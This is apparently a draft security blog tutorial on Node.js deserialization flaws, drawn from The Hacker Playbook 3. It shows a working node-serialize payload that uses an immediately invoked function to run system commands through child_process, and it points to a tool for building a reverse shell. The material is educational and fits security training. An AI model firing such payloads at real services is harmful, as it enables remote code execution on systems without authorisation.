---
title: "Deserialization"
date: 2022-08-13T00:03:08-04:00
description: "Why So Serial?"
tags: [deserializtion]
featured_image: "images/Deserialization.jpg"
# images is optional, but needed for showing Twitter Card
images: []
categories: OWASP TOP10
comment: true
draft: true
---

# Node.js Deserialization

> This is example from the The Hacker Playbook 3

## Find the possible serialize object

In HTTP cookie header, I decode the cookie using base64. It's in json format, it might be a serialized object.

```
{"module":"node-serialize"}
```

Then, we use the following payload for POC.

```json
{"thp":"_$$ND_FUNC$$_function () {
 	require('child_process').exec('echo node deserialization is awesome!! >> /opt/web/chatSupportSystems/public/hacked.txt', function(error, stdout, stderr) { console.log(stdout) });} ()"}
```

It basically contains 2 import part, First a function that execute system command

```js
# normal function creation
# create a function that revoke process that execute system command
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
```

Next, JavaScript's [Immediately invoked function expression (IIFE). 

If it confuses you, like I do, just know it's to add a bracket `()` after the function, then the function will be execute after the object is created. Which looks like this

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
```

 To get a shell, we could use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to create a reverse shell.

```js
{"thp":"_$$ND_FUNC$$_function () {<paste your payload here>}()"}
```

---

Reference: 

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
